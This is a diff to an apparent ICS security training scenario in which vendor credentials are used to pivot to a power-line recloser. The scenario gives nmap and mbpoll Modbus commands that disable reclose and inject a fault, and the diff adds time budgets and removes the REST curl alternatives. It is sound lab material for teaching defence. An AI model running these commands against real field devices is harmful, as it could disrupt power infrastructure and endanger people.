@@ -1,7 +1,7 @@
 id: vendor-rdp-compromise
 order: 4
 name: "Vendor Remote Access Compromise (Bonus)"
-summary: "Optional — Compromised vendor credentials used to pivot from DMZ to field devices via Modbus."
+summary: "Optional — Compromised vendor credentials used to pivot from DMZ to field devices via Modbus (15 min)."
 description: >
   A vendor's remote access credentials are compromised via phishing.
   The attacker uses the vendor jump box to pivot through the DMZ
@@ -27,6 +27,8 @@ steps:
       From the vendor jump box, verify you can reach field devices:
 
         nmap -p 502,8080,20000 10.40.40.21
+
+      **Time budget:** 15 minutes.
     action:
       type: check
       expect:
@@ -41,11 +43,6 @@ steps:
       on the recloser. Via Modbus:
 
         mbpoll -a 1 -t 0 -r 2 10.40.40.21 0
-
-      Or via the REST API:
-
-        curl -X POST http://10.40.40.21:8080/api/command \
-          -d '{"command":"disable_reclose","source":"10.20.20.10"}'
 
       With the weak baseline policy, containd allows this traffic
       from the vendor zone to field devices.
@@ -64,12 +61,7 @@ steps:
 
       From the vendor jump box, inject a fault via Modbus:
 
-        mbpoll -a 1 -t 0 -r 4 10.40.40.21 1
-
-      Or via REST:
-
-        curl -X POST http://10.40.40.21:8080/api/command \
-          -d '{"command":"inject_fault","source":"10.20.20.10"}'
+        mbpoll -a 1 -t 0 -r 5 10.40.40.21 1
     action:
       type: command
       device: recloser
@@ -85,10 +77,6 @@ steps:
       Verify from the vendor box via Modbus:
 
         mbpoll -a 1 -t 0 -r 1 10.40.40.21 -c 5 -1
-
-      Or check state via REST:
-
-        curl -s http://10.40.40.21:8080/api/state | python3 -m json.tool
 
       Coil 0 (closed) should be OFF, coil 1 (reclose) OFF, coil 2 (lockout) ON.
     action:
